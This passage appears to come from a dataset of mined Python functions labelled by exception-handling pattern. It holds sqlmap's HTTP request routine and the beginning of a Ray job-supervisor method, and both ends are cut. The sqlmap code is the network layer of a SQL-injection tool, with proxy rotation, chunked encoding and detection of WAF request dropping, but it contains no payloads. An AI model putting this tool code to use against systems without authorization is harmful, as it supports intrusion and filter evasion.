        post = kwargs.get(""post"", None)
        method = kwargs.get(""method"", None)
        cookie = kwargs.get(""cookie"", None)
        ua = kwargs.get(""ua"", None) or conf.agent
        referer = kwargs.get(""referer"", None) or conf.referer
        host = kwargs.get(""host"", None) or conf.host
        direct_ = kwargs.get(""direct"", False)
        multipart = kwargs.get(""multipart"", None)
        silent = kwargs.get(""silent"", False)
        raise404 = kwargs.get(""raise404"", True)
        timeout = kwargs.get(""timeout"", None) or conf.timeout
        auxHeaders = kwargs.get(""auxHeaders"", None)
        response = kwargs.get(""response"", False)
        ignoreTimeout = kwargs.get(""ignoreTimeout"", False) or kb.ignoreTimeout or conf.ignoreTimeouts
        refreshing = kwargs.get(""refreshing"", False)
        retrying = kwargs.get(""retrying"", False)
        crawling = kwargs.get(""crawling"", False)
        checking = kwargs.get(""checking"", False)
        skipRead = kwargs.get(""skipRead"", False)
        finalCode = kwargs.get(""finalCode"", False)
        chunked = kwargs.get(""chunked"", False) or conf.chunked

        start = time.time()

        if isinstance(conf.delay, (int, float)) and conf.delay > 0:
            time.sleep(conf.delay)

        threadData = getCurrentThreadData()
        with kb.locks.request:
            kb.requestCounter += 1
            threadData.lastRequestUID = kb.requestCounter

            if conf.proxyFreq:
                if kb.requestCounter % conf.proxyFreq == 0:
                    conf.proxy = None

                    warnMsg = ""changing proxy""
                    logger.warning(warnMsg)

                    setHTTPHandlers()

        if conf.dummy or conf.murphyRate and randomInt() % conf.murphyRate == 0:
            if conf.murphyRate:
                time.sleep(randomInt() % (MAX_MURPHY_SLEEP_TIME + 1))

            page, headers, code = randomStr(int(randomInt()), alphabet=[_unichr(_) for _ in xrange(256)]), None, None if not conf.murphyRate else randomInt(3)

            threadData.lastPage = page
            threadData.lastCode = code

            return page, headers, code

        if conf.liveCookies:
            with kb.locks.liveCookies:
                if not checkFile(conf.liveCookies, raiseOnError=False) or os.path.getsize(conf.liveCookies) == 0:
                    warnMsg = ""[%s] [WARNING] live cookies file '%s' is empty or non-existent. Waiting for timeout (%d seconds)"" % (time.strftime(""%X""), conf.liveCookies, LIVE_COOKIES_TIMEOUT)
                    dataToStdout(warnMsg)

                    valid = False
                    for _ in xrange(LIVE_COOKIES_TIMEOUT):
                        if checkFile(conf.liveCookies, raiseOnError=False) and os.path.getsize(conf.liveCookies) > 0:
                            valid = True
                            break
                        else:
                            dataToStdout('.')
                            time.sleep(1)

                    dataToStdout(""\n"")

                    if not valid:
                        errMsg = ""problem occurred while loading cookies from file '%s'"" % conf.liveCookies
                        raise SqlmapValueException(errMsg)

                cookie = openFile(conf.liveCookies).read().strip()
                cookie = re.sub(r""(?i)\ACookie:\s*"", """", cookie)

        if multipart:
            post = multipart
        else:
            if not post:
                chunked = False

            elif chunked:
                post = _urllib.parse.unquote(post)
                post = chunkSplitPostData(post)

        webSocket = url.lower().startswith(""ws"")

        if not _urllib.parse.urlsplit(url).netloc:
            url = _urllib.parse.urljoin(conf.url, url)

        # flag to know if we are dealing with the same target host
        target = checkSameHost(url, conf.url)

        if not retrying:
            # Reset the number of connection retries
            threadData.retriesCount = 0

        # fix for known issue when urllib2 just skips the other part of provided
        # url splitted with space char while urlencoding it in the later phase
        url = url.replace("" "", ""%20"")

        if ""://"" not in url:
            url = ""http://%s"" % url

        conn = None
        page = None
        code = None
        status = None

        _ = _urllib.parse.urlsplit(url)
        requestMsg = u""HTTP request [#%d]:\r\n%s "" % (threadData.lastRequestUID, method or (HTTPMETHOD.POST if post is not None else HTTPMETHOD.GET))
        requestMsg += getUnicode((""%s%s"" % (_.path or ""/"", (""?%s"" % _.query) if _.query else """")) if not any((refreshing, crawling, checking)) else url)
        responseMsg = u""HTTP response ""
        requestHeaders = u""""
        responseHeaders = None
        logHeaders = u""""
        skipLogTraffic = False

        raise404 = raise404 and not kb.ignoreNotFound

        # support for non-latin (e.g. cyrillic) URLs as urllib/urllib2 doesn't
        # support those by default
        url = asciifyUrl(url)

        try:
            socket.setdefaulttimeout(timeout)

            if direct_:
                if '?' in url:
                    url, params = url.split('?', 1)
                    params = urlencode(params)
                    url = ""%s?%s"" % (url, params)

            elif any((refreshing, crawling, checking)):
                pass

            elif target:
                if conf.forceSSL:
                    url = re.sub(r""(?i)\A(http|ws):"", r""\g<1>s:"", url)
                    url = re.sub(r""(?i):80/"", "":443/"", url)

                if PLACE.GET in conf.parameters and not get:
                    get = conf.parameters[PLACE.GET]

                    if not conf.skipUrlEncode:
                        get = urlencode(get, limit=True)

                if get:
                    if '?' in url:
                        url = ""%s%s%s"" % (url, DEFAULT_GET_POST_DELIMITER, get)
                        requestMsg += ""%s%s"" % (DEFAULT_GET_POST_DELIMITER, get)
                    else:
                        url = ""%s?%s"" % (url, get)
                        requestMsg += ""?%s"" % get

                if PLACE.POST in conf.parameters and not post and method != HTTPMETHOD.GET:
                    post = conf.parameters[PLACE.POST]

            elif get:
                url = ""%s?%s"" % (url, get)
                requestMsg += ""?%s"" % get

            requestMsg += "" %s"" % _http_client.HTTPConnection._http_vsn_str

            # Prepare HTTP headers
            headers = forgeHeaders({HTTP_HEADER.COOKIE: cookie, HTTP_HEADER.USER_AGENT: ua, HTTP_HEADER.REFERER: referer, HTTP_HEADER.HOST: host}, base=None if target else {})

            if HTTP_HEADER.COOKIE in headers:
                cookie = headers[HTTP_HEADER.COOKIE]

            if kb.authHeader:
                headers[HTTP_HEADER.AUTHORIZATION] = kb.authHeader

            if kb.proxyAuthHeader:
                headers[HTTP_HEADER.PROXY_AUTHORIZATION] = kb.proxyAuthHeader

            if not conf.requestFile or not target:
                if not getHeader(headers, HTTP_HEADER.HOST):
                    headers[HTTP_HEADER.HOST] = getHostHeader(url)

                if not getHeader(headers, HTTP_HEADER.ACCEPT):
                    headers[HTTP_HEADER.ACCEPT] = HTTP_ACCEPT_HEADER_VALUE

                if not getHeader(headers, HTTP_HEADER.ACCEPT_ENCODING):
                    headers[HTTP_HEADER.ACCEPT_ENCODING] = HTTP_ACCEPT_ENCODING_HEADER_VALUE if kb.pageCompress else ""identity""

            elif conf.requestFile and getHeader(headers, HTTP_HEADER.USER_AGENT) == DEFAULT_USER_AGENT:
                for header in headers:
                    if header.upper() == HTTP_HEADER.USER_AGENT.upper():
                        del headers[header]
                        break

            if post is not None and not multipart and not getHeader(headers, HTTP_HEADER.CONTENT_TYPE):
                headers[HTTP_HEADER.CONTENT_TYPE] = POST_HINT_CONTENT_TYPES.get(kb.postHint, DEFAULT_CONTENT_TYPE if unArrayizeValue(conf.base64Parameter) != HTTPMETHOD.POST else PLAIN_TEXT_CONTENT_TYPE)

            if headers.get(HTTP_HEADER.CONTENT_TYPE) == POST_HINT_CONTENT_TYPES[POST_HINT.MULTIPART]:
                warnMsg = ""missing 'boundary parameter' in '%s' header. "" % HTTP_HEADER.CONTENT_TYPE
                warnMsg += ""Will try to reconstruct""
                singleTimeWarnMessage(warnMsg)

                boundary = findMultipartPostBoundary(conf.data)
                if boundary:
                    headers[HTTP_HEADER.CONTENT_TYPE] = ""%s; boundary=%s"" % (headers[HTTP_HEADER.CONTENT_TYPE], boundary)

            if conf.keepAlive:
                headers[HTTP_HEADER.CONNECTION] = ""keep-alive""

            if chunked:
                headers[HTTP_HEADER.TRANSFER_ENCODING] = ""chunked""

            if auxHeaders:
                headers = forgeHeaders(auxHeaders, headers)

            if kb.headersFile:
                content = openFile(kb.headersFile, ""rb"").read()
                for line in content.split(""\n""):
                    line = getText(line.strip())
                    if ':' in line:
                        header, value = line.split(':', 1)
                        headers[header] = value

            if conf.localhost:
                headers[HTTP_HEADER.HOST] = ""localhost""

            for key, value in list(headers.items()):
                if key.upper() == HTTP_HEADER.ACCEPT_ENCODING.upper():
                    value = re.sub(r""(?i)(,)br(,)?"", lambda match: ',' if match.group(1) and match.group(2) else """", value) or ""identity""

                del headers[key]
                if isinstance(value, six.string_types):
                    for char in (r""\r"", r""\n""):
                        value = re.sub(r""(%s)([^ \t])"" % char, r""\g<1>\t\g<2>"", value)
                    headers[getBytes(key) if six.PY2 else key] = getBytes(value.strip(""\r\n""))  # Note: Python3 has_header() expects non-bytes value

            if six.PY2:
                url = getBytes(url)  # Note: Python3 requires text while Python2 has problems when mixing text with binary POST

            if webSocket:
                ws = websocket.WebSocket()
                ws.settimeout(WEBSOCKET_INITIAL_TIMEOUT if kb.webSocketRecvCount is None else timeout)
                ws.connect(url, header=(""%s: %s"" % _ for _ in headers.items() if _[0] not in (""Host"",)), cookie=cookie)  # WebSocket will add Host field of headers automatically
                ws.send(urldecode(post or """"))

                _page = []

                if kb.webSocketRecvCount is None:
                    while True:
                        try:
                            _page.append(ws.recv())
                        except websocket.WebSocketTimeoutException:
                            kb.webSocketRecvCount = len(_page)
                            break
                else:
                    for i in xrange(max(1, kb.webSocketRecvCount)):
                        _page.append(ws.recv())

                page = ""\n"".join(_page)

                ws.close()
                code = ws.status
                status = _http_client.responses[code]

                class _(dict):
                    pass

                responseHeaders = _(ws.getheaders())
                responseHeaders.headers = [""%s: %s\r\n"" % (_[0].capitalize(), _[1]) for _ in responseHeaders.items()]

                requestHeaders += ""\r\n"".join([""%s: %s"" % (getUnicode(key.capitalize() if hasattr(key, ""capitalize"") else key), getUnicode(value)) for (key, value) in responseHeaders.items()])
                requestMsg += ""\r\n%s"" % requestHeaders

                if post is not None:
                    requestMsg += ""\r\n\r\n%s"" % getUnicode(post)

                requestMsg += ""\r\n""

                threadData.lastRequestMsg = requestMsg

                logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)
            else:
                post = getBytes(post)

                if unArrayizeValue(conf.base64Parameter) == HTTPMETHOD.POST:
                    if kb.place != HTTPMETHOD.POST:
                        conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)
                    else:
                        post = urldecode(post, convall=True)
                        post = encodeBase64(post)

                if target and cmdLineOptions.method or method and method not in (HTTPMETHOD.GET, HTTPMETHOD.POST):
                    req = MethodRequest(url, post, headers)
                    req.set_method(cmdLineOptions.method or method)
                elif url is not None:
                    req = _urllib.request.Request(url, post, headers)
                else:
                    return None, None, None

                for function in kb.preprocessFunctions:
                    try:
                        function(req)
                    except Exception as ex:
                        errMsg = ""error occurred while running preprocess ""
                        errMsg += ""function '%s' ('%s')"" % (function.__name__, getSafeExString(ex))
                        raise SqlmapGenericException(errMsg)
                    else:
                        post, headers = req.data, req.headers

                requestHeaders += ""\r\n"".join([""%s: %s"" % (getUnicode(key.capitalize() if hasattr(key, ""capitalize"") else key), getUnicode(value)) for (key, value) in req.header_items()])

                if not getRequestHeader(req, HTTP_HEADER.COOKIE) and conf.cj:
                    conf.cj._policy._now = conf.cj._now = int(time.time())
                    with conf.cj._cookies_lock:
                        cookies = conf.cj._cookies_for_request(req)
                    requestHeaders += ""\r\n%s"" % (""Cookie: %s"" % "";"".join(""%s=%s"" % (getUnicode(cookie.name), getUnicode(cookie.value)) for cookie in cookies))

                if post is not None:
                    if not getRequestHeader(req, HTTP_HEADER.CONTENT_LENGTH) and not chunked:
                        requestHeaders += ""\r\n%s: %d"" % (string.capwords(HTTP_HEADER.CONTENT_LENGTH), len(post))

                if not getRequestHeader(req, HTTP_HEADER.CONNECTION):
                    requestHeaders += ""\r\n%s: %s"" % (HTTP_HEADER.CONNECTION, ""close"" if not conf.keepAlive else ""keep-alive"")

                requestMsg += ""\r\n%s"" % requestHeaders

                if post is not None:
                    requestMsg += ""\r\n\r\n%s"" % getUnicode(post)

                if not chunked:
                    requestMsg += ""\r\n""

                if not multipart:
                    threadData.lastRequestMsg = requestMsg

                    logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)

                if conf.cj:
                    for cookie in conf.cj:
                        if cookie.value is None:
                            cookie.value = """"
                        else:
                            for char in (r""\r"", r""\n""):
                                cookie.value = re.sub(r""(%s)([^ \t])"" % char, r""\g<1>\t\g<2>"", cookie.value)

                conn = _urllib.request.urlopen(req)

                if not kb.authHeader and getRequestHeader(req, HTTP_HEADER.AUTHORIZATION) and (conf.authType or """").lower() == AUTH_TYPE.BASIC.lower():
                    kb.authHeader = getUnicode(getRequestHeader(req, HTTP_HEADER.AUTHORIZATION))

                if not kb.proxyAuthHeader and getRequestHeader(req, HTTP_HEADER.PROXY_AUTHORIZATION):
                    kb.proxyAuthHeader = getRequestHeader(req, HTTP_HEADER.PROXY_AUTHORIZATION)

                # Return response object
                if response:
                    return conn, None, None

                # Get HTTP response
                if hasattr(conn, ""redurl""):
                    page = (threadData.lastRedirectMsg[1] if kb.choices.redirect == REDIRECTION.NO else Connect._connReadProxy(conn)) if not skipRead else None
                    skipLogTraffic = kb.choices.redirect == REDIRECTION.NO
                    code = conn.redcode if not finalCode else code
                else:
                    page = Connect._connReadProxy(conn) if not skipRead else None

                if conn:
                    code = (code or conn.code) if conn.code == kb.originalCode else conn.code  # do not override redirection code (for comparison purposes)
                    responseHeaders = conn.info()
                    responseHeaders[URI_HTTP_HEADER] = conn.geturl() if hasattr(conn, ""geturl"") else url

                    if hasattr(conn, ""redurl""):
                        responseHeaders[HTTP_HEADER.LOCATION] = conn.redurl

                    responseHeaders = patchHeaders(responseHeaders)
                    kb.serverHeader = responseHeaders.get(HTTP_HEADER.SERVER, kb.serverHeader)
                else:
                    code = None
                    responseHeaders = {}

                page = decodePage(page, responseHeaders.get(HTTP_HEADER.CONTENT_ENCODING), responseHeaders.get(HTTP_HEADER.CONTENT_TYPE), percentDecode=not crawling)
                status = getUnicode(conn.msg) if conn and getattr(conn, ""msg"", None) else None

            kb.connErrorCounter = 0

            if not refreshing:
                refresh = responseHeaders.get(HTTP_HEADER.REFRESH, """").split(""url="")[-1].strip()

                if extractRegexResult(META_REFRESH_REGEX, page):
                    refresh = extractRegexResult(META_REFRESH_REGEX, page)

                    debugMsg = ""got HTML meta refresh header""
                    logger.debug(debugMsg)

                if not refresh:
                    refresh = extractRegexResult(JAVASCRIPT_HREF_REGEX, page)

                    if refresh:
                        debugMsg = ""got Javascript redirect logic""
                        logger.debug(debugMsg)

                if refresh:
                    if kb.alwaysRefresh is None:
                        msg = ""got a refresh intent ""
                        msg += ""(redirect like response common to login pages) to '%s'. "" % refresh
                        msg += ""Do you want to apply it from now on? [Y/n]""

                        kb.alwaysRefresh = readInput(msg, default='Y', boolean=True)

                    if kb.alwaysRefresh:
                        if re.search(r""\Ahttps?://"", refresh, re.I):
                            url = refresh
                        else:
                            url = _urllib.parse.urljoin(url, refresh)

                        threadData.lastRedirectMsg = (threadData.lastRequestUID, page)
                        kwargs[""refreshing""] = True
                        kwargs[""url""] = url
                        kwargs[""get""] = None
                        kwargs[""post""] = None

                        try:
                            return Connect._getPageProxy(**kwargs)
                        except SqlmapSyntaxException:
                            pass

            # Explicit closing of connection object
            if conn and not conf.keepAlive:
                try:
                    if hasattr(conn.fp, '_sock'):
                        conn.fp._sock.close()
                    conn.close()
                except Exception as ex:
                    warnMsg = ""problem occurred during connection closing ('%s')"" % getSafeExString(ex)
                    logger.warning(warnMsg)

        except SqlmapConnectionException as ex:
            if conf.proxyList and not kb.threadException:
                warnMsg = ""unable to connect to the target URL ('%s')"" % getSafeExString(ex)
                logger.critical(warnMsg)
                threadData.retriesCount = conf.retries
                return Connect._retryProxy(**kwargs)
            else:
                raise

        except _urllib.error.HTTPError as ex:
            page = None
            responseHeaders = None

            if checking:
                return None, None, None

            try:
                page = ex.read() if not skipRead else None
                responseHeaders = ex.info()
                responseHeaders[URI_HTTP_HEADER] = ex.geturl()
                responseHeaders = patchHeaders(responseHeaders)
                page = decodePage(page, responseHeaders.get(HTTP_HEADER.CONTENT_ENCODING), responseHeaders.get(HTTP_HEADER.CONTENT_TYPE), percentDecode=not crawling)
            except socket.timeout:
                warnMsg = ""connection timed out while trying ""
                warnMsg += ""to get error page information (%d)"" % ex.code
                logger.warning(warnMsg)
                return None, None, None
            except KeyboardInterrupt:
                raise
            except:
                pass
            finally:
                page = getUnicode(page)

            code = ex.code
            status = getUnicode(getattr(ex, ""reason"", None) or getSafeExString(ex).split("": "", 1)[-1])

            kb.originalCode = kb.originalCode or code
            threadData.lastHTTPError = (threadData.lastRequestUID, code, status)
            kb.httpErrorCodes[code] = kb.httpErrorCodes.get(code, 0) + 1

            responseMsg += ""[#%d] (%s %s):\r\n"" % (threadData.lastRequestUID, code, status)

            if responseHeaders and getattr(responseHeaders, ""headers"", None):
                logHeaders = """".join(getUnicode(responseHeaders.headers)).strip()

            logHTTPTraffic(requestMsg, ""%s%s\r\n\r\n%s"" % (responseMsg, logHeaders, (page or """")[:MAX_CONNECTION_READ_SIZE]), start, time.time())

            skipLogTraffic = True

            if conf.verbose <= 5:
                responseMsg += getUnicode(logHeaders)
            elif conf.verbose > 5:
                responseMsg += ""%s\r\n\r\n%s"" % (logHeaders, (page or """")[:MAX_CONNECTION_READ_SIZE])

            if not multipart:
                logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)

            if code in conf.abortCode:
                errMsg = ""aborting due to detected HTTP code '%d'"" % code
                singleTimeLogMessage(errMsg, logging.CRITICAL)
                raise SystemExit

            if ex.code not in (conf.ignoreCode or []):
                if ex.code == _http_client.UNAUTHORIZED:
                    errMsg = ""not authorized, try to provide right HTTP ""
                    errMsg += ""authentication type and valid credentials (%d). "" % code
                    errMsg += ""If this is intended, try to rerun by providing ""
                    errMsg += ""a valid value for option '--ignore-code'""
                    raise SqlmapConnectionException(errMsg)
                elif chunked and ex.code in (_http_client.METHOD_NOT_ALLOWED, _http_client.LENGTH_REQUIRED):
                    warnMsg = ""turning off HTTP chunked transfer encoding ""
                    warnMsg += ""as it seems that the target site doesn't support it (%d)"" % code
                    singleTimeWarnMessage(warnMsg)
                    conf.chunked = kwargs[""chunked""] = False
                    return Connect.getPage(**kwargs)
                elif ex.code == _http_client.REQUEST_URI_TOO_LONG:
                    warnMsg = ""request URI is marked as too long by the target. ""
                    warnMsg += ""you are advised to try a switch '--no-cast' and/or '--no-escape'""
                    singleTimeWarnMessage(warnMsg)
                elif ex.code == _http_client.NOT_FOUND:
                    if raise404:
                        errMsg = ""page not found (%d)"" % code
                        raise SqlmapConnectionException(errMsg)
                    else:
                        debugMsg = ""page not found (%d)"" % code
                        singleTimeLogMessage(debugMsg, logging.DEBUG)
                elif ex.code == _http_client.GATEWAY_TIMEOUT:
                    if ignoreTimeout:
                        return None if not conf.ignoreTimeouts else """", None, None
                    else:
                        warnMsg = ""unable to connect to the target URL (%d - %s)"" % (ex.code, _http_client.responses[ex.code])
                        if threadData.retriesCount < conf.retries and not kb.threadException:
                            warnMsg += "". sqlmap is going to retry the request""
                            logger.critical(warnMsg)
                            return Connect._retryProxy(**kwargs)
                        elif kb.testMode:
                            logger.critical(warnMsg)
                            return None, None, None
                        else:
                            raise SqlmapConnectionException(warnMsg)
                else:
                    debugMsg = ""got HTTP error code: %d ('%s')"" % (code, status)
                    logger.debug(debugMsg)

        except (_urllib.error.URLError, socket.error, socket.timeout, _http_client.HTTPException, struct.error, binascii.Error, ProxyError, SqlmapCompressionException, WebSocketException, TypeError, ValueError, OverflowError, AttributeError, OSError):
            tbMsg = traceback.format_exc()

            if conf.debug:
                dataToStdout(tbMsg)

            if checking:
                return None, None, None
            elif ""AttributeError:"" in tbMsg:
                if ""WSAECONNREFUSED"" in tbMsg:
                    return None, None, None
                else:
                    raise
            elif ""no host given"" in tbMsg:
                warnMsg = ""invalid URL address used (%s)"" % repr(url)
                raise SqlmapSyntaxException(warnMsg)
            elif any(_ in tbMsg for _ in (""forcibly closed"", ""Connection is already closed"", ""ConnectionAbortedError"")):
                warnMsg = ""connection was forcibly closed by the target URL""
            elif ""timed out"" in tbMsg:
                if kb.testMode and kb.testType not in (None, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED):
                    singleTimeWarnMessage(""there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests"")
                    kb.droppingRequests = True
                warnMsg = ""connection timed out to the target URL""
            elif ""Connection reset"" in tbMsg:
                if not conf.disablePrecon:
                    singleTimeWarnMessage(""turning off pre-connect mechanism because of connection reset(s)"")
                    conf.disablePrecon = True

                if kb.testMode:
                    singleTimeWarnMessage(""there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests"")
                    kb.droppingRequests = True
                warnMsg = ""connection reset to the target URL""
            elif ""URLError"" in tbMsg or ""error"" in tbMsg:
                warnMsg = ""unable to connect to the target URL""
                match = re.search(r""Errno \d+\] ([^>\n]+)"", tbMsg)
                if match:
                    warnMsg += "" ('%s')"" % match.group(1).strip()
            elif ""NTLM"" in tbMsg:
                warnMsg = ""there has been a problem with NTLM authentication""
            elif ""Invalid header name"" in tbMsg:  # (e.g. PostgreSQL ::Text payload)
                return None, None, None
            elif ""BadStatusLine"" in tbMsg:
                warnMsg = ""connection dropped or unknown HTTP ""
                warnMsg += ""status code received""
                if not conf.agent and not conf.randomAgent:
                    warnMsg += "". Try to force the HTTP User-Agent ""
                    warnMsg += ""header with option '--user-agent' or switch '--random-agent'""
            elif ""IncompleteRead"" in tbMsg:
                warnMsg = ""there was an incomplete read error while retrieving data ""
                warnMsg += ""from the target URL""
            elif ""Handshake status"" in tbMsg:
                status = re.search(r""Handshake status ([\d]{3})"", tbMsg)
                errMsg = ""websocket handshake status %s"" % status.group(1) if status else ""unknown""
                raise SqlmapConnectionException(errMsg)
            elif ""SqlmapCompressionException"" in tbMsg:
                warnMsg = ""problems with response (de)compression""
                retrying = True
            else:
                warnMsg = ""unable to connect to the target URL""

            if ""BadStatusLine"" not in tbMsg and any((conf.proxy, conf.tor)):
                warnMsg += "" or proxy""

            if silent:
                return None, None, None

            with kb.locks.connError:
                kb.connErrorCounter += 1

                if kb.connErrorCounter >= MAX_CONSECUTIVE_CONNECTION_ERRORS and kb.choices.connError is None:
                    message = ""there seems to be a continuous problem with connection to the target. ""
                    message += ""Are you sure that you want to continue? [y/N] ""

                    kb.choices.connError = readInput(message, default='N', boolean=True)

                if kb.choices.connError is False:
                    raise SqlmapSkipTargetException

            if ""forcibly closed"" in tbMsg:
                logger.critical(warnMsg)
                return None, None, None
            elif ignoreTimeout and any(_ in tbMsg for _ in (""timed out"", ""IncompleteRead"", ""Interrupted system call"")):
                return None if not conf.ignoreTimeouts else """", None, None
            elif threadData.retriesCount < conf.retries and not kb.threadException:
                warnMsg += "". sqlmap is going to retry the request""
                if not retrying:
                    warnMsg += ""(s)""
                    logger.critical(warnMsg)
                else:
                    logger.debug(warnMsg)
                return Connect._retryProxy(**kwargs)
            elif kb.testMode or kb.multiThreadMode:
                logger.critical(warnMsg)
                return None, None, None
            else:
                raise SqlmapConnectionException(warnMsg)

        finally:
            if isinstance(page, six.binary_type):
                if HTTP_HEADER.CONTENT_TYPE in (responseHeaders or {}) and not re.search(TEXT_CONTENT_TYPE_REGEX, responseHeaders[HTTP_HEADER.CONTENT_TYPE]):
                    page = six.text_type(page, errors=""ignore"")
                else:
                    page = getUnicode(page)

            for function in kb.postprocessFunctions:
                try:
                    page, responseHeaders, code = function(page, responseHeaders, code)
                except Exception as ex:
                    errMsg = ""error occurred while running postprocess ""
                    errMsg += ""function '%s' ('%s')"" % (function.__name__, getSafeExString(ex))
                    raise SqlmapGenericException(errMsg)

            for _ in (getattr(conn, ""redcode"", None), code):
                if _ is not None and _ in conf.abortCode:
                    errMsg = ""aborting due to detected HTTP code '%d'"" % _
                    singleTimeLogMessage(errMsg, logging.CRITICAL)
                    raise SystemExit

            threadData.lastPage = page
            threadData.lastCode = code

            socket.setdefaulttimeout(conf.timeout)

        # Dirty patch for Python3.11.0a7 (e.g. https://github.com/sqlmapproject/sqlmap/issues/5091)
        if not sys.version.startswith(""3.11.""):
            if conf.retryOn and re.search(conf.retryOn, page, re.I):
                if threadData.retriesCount < conf.retries:
                    warnMsg = ""forced retry of the request because of undesired page content""
                    logger.warning(warnMsg)
                    return Connect._retryProxy(**kwargs)

        processResponse(page, responseHeaders, code, status)

        if not skipLogTraffic:
            if conn and getattr(conn, ""redurl"", None):
                _ = _urllib.parse.urlsplit(conn.redurl)
                _ = (""%s%s"" % (_.path or ""/"", (""?%s"" % _.query) if _.query else """"))
                requestMsg = re.sub(r""(\n[A-Z]+ ).+?( HTTP/\d)"", r""\g<1>%s\g<2>"" % getUnicode(_).replace(""\\"", ""\\\\""), requestMsg, 1)

                if kb.resendPostOnRedirect is False:
                    requestMsg = re.sub(r""(\[#\d+\]:\n)POST "", r""\g<1>GET "", requestMsg)
                    requestMsg = re.sub(r""(?i)Content-length: \d+\n"", """", requestMsg)
                    requestMsg = re.sub(r""(?s)\n\n.+"", ""\n"", requestMsg)

                responseMsg += ""[#%d] (%s %s):\r\n"" % (threadData.lastRequestUID, conn.code, status)
            elif ""\n"" not in responseMsg:
                responseMsg += ""[#%d] (%s %s):\r\n"" % (threadData.lastRequestUID, code, status)

            if responseHeaders:
                logHeaders = """".join(getUnicode(responseHeaders.headers)).strip()

            logHTTPTraffic(requestMsg, ""%s%s\r\n\r\n%s"" % (responseMsg, logHeaders, (page or """")[:MAX_CONNECTION_READ_SIZE]), start, time.time())

            if conf.verbose <= 5:
                responseMsg += getUnicode(logHeaders)
            elif conf.verbose > 5:
                responseMsg += ""%s\r\n\r\n%s"" % (logHeaders, (page or """")[:MAX_CONNECTION_READ_SIZE])

            if not multipart:
                logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)

        return page, responseHeaders, code",Nested Try-Except Blocks,1
214,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/dashboard/modules/job/job_manager.py,run,"async def run(
        self,
        # Signal actor used in testing to capture PENDING -> RUNNING cases
        _start_signal_actor: Optional[ActorHandle] = None,
        resources_specified: bool = False,
    ):
        """"""
        Stop and start both happen asynchronously, coordinated by asyncio event
        and coroutine, respectively.

        1) Sets job status as running
        2) Pass runtime env and metadata to subprocess as serialized env
            variables.
        3) Handle concurrent events of driver execution and
        """"""
        curr_info = await self._job_info_client.get_info(self._job_id)
        if curr_info is None:
            raise RuntimeError(f""Status could not be retrieved for job {self._job_id}."")
        curr_status = curr_info.status
        curr_message = curr_info.message
        if curr_status == JobStatus.RUNNING:
            raise RuntimeError(
                f""Job {self._job_id} is already in RUNNING state. ""
                f""JobSupervisor.run() should only be called once. ""
            )
        if curr_status != JobStatus.PENDING:
            raise RuntimeError(
                f""Job {self._job_id} is not in PENDING state. ""
                f""Current status is {curr_status} with message {curr_message}.""
            )

        if _start_signal_actor:
            # Block in PENDING state until start signal received.
            await _start_signal_actor.wait.remote()

        driver_agent_http_address = (
            ""http://""
            f""{ray.worker.global_worker.node.node_ip_address}:""
            f""{ray.worker.global_worker.node.dashboard_agent_listen_port}""
        )
        driver_node_id = ray.worker.global_worker.current_node_id.hex()

        await self._job_info_client.put_status(
            self._job_id,
            JobStatus.RUNNING,
            jobinfo_replace_kwargs={
                ""driver_agent_http_address"": driver_agent_http_address,
                ""driver_node_id"": driver_node_id,
            },
        )

        try:
            # Configure environment variables for the child process. These
            # will *not* be set in the runtime_env, so they apply to the driver
            # only, not its tasks & actors.
            os.environ.update(self._get_driver_env_vars(resources_specified))
            logger.info(
                ""Submitting job with RAY_ADDRESS = ""
                f""{os.environ[ray_constants.RAY_ADDRESS_ENVIRONMENT_VARIABLE]}""
            )
            log_path = self._log_client.get_log_file_path(self._job_id)
            child_process = self._exec_entrypoint(log_path)
            child_pid = child_process.pid

            polling_task = create_task(self._polling(child_process))
            finished, _ = await asyncio.wait(
                [polling_task, create_task(self._stop_event.wait())],
                return_when=FIRST_COMPLETED,
            )

            if self._stop_event.is_set():
                polling_task.cancel()
                if sys.platform == ""win32"" and self._win32_job_object:
                    win32job.TerminateJobObject(self._win32_job_object, -1)
                elif sys.platform != ""win32"":
                    stop_signal = os.environ.get(""RAY_JOB_STOP_SIGNAL"", ""SIGTERM"")
                    if stop_signal not in self.VALID_STOP_SIGNALS:
                        logger.warning(
                            f""{stop_signal} not a valid stop signal. Terminating ""
                            ""job with SIGTERM.""
                        )
                        stop_signal = ""SIGTERM""

                    job_process = psutil.Process(child_pid)
                    proc_to_kill = [job_process] + job_process.children(recursive=True)

                    # Send stop signal and wait for job to terminate gracefully,
                    # otherwise SIGKILL job forcefully after timeout.
                    self._kill_processes(proc_to_kill, getattr(signal, stop_signal))
                    try:
                        stop_job_wait_time = int(
                            os.environ.get(
                                ""RAY_JOB_STOP_WAIT_TIME_S"",
                                self.DEFAULT_RAY_JOB_STOP_WAIT_TIME_S,
                            )
                        )
                        poll_job_stop_task = create_task(self._poll_all(proc_to_kill))
                        await asyncio.wait_for(poll_job_stop_task, stop_job_wait_time)
                        logger.info(
                            f""Job {self._job_id} has been terminated gracefully ""
                            f""with {stop_signal}.""
                        )
                    except asyncio.TimeoutError:
                        logger.warning(
                            f""Attempt to gracefully terminate job {self._job_id} ""
                            f""through {stop_signal} has timed out after ""
                            f""{stop_job_wait_time} seconds. Job is now being ""
                            ""force-killed with SIGKILL.""
                        )
                        self._kill_processes(proc_to_kill, signal.SIGKILL)

                await self._job_info_client.put_status(self._job_id, JobStatus.STOPPED)
            else:
                # Child process finished execution and no stop event is set
                # at the same time
                assert len(finished) == 1, ""Should have only one coroutine done""
                [child_process_task] = finished
                return_code = child_process_task.result()
                logger.info(
                    f""Job {self._job_id} entrypoint command ""
                    f""exited with code {return_code}""
                )
                if return_code == 0:
                    await self._job_info_client.put_status(
                        self._job_id,
                        JobStatus.SUCCEEDED,
                        driver_exit_code=return_code,
                    )
                else:
                    log_tail = self._log_client.get_last_n_log_lines(self._job_id)
                    if log_tail is not None and log_tail != """":
                        message = (
                            ""Job entrypoint command ""
                            f""failed with exit code {return_code}, ""
                            ""last available logs (truncated to 20,000 chars):\n""
                            + log_tail
                        )
                    else:
                        message = (
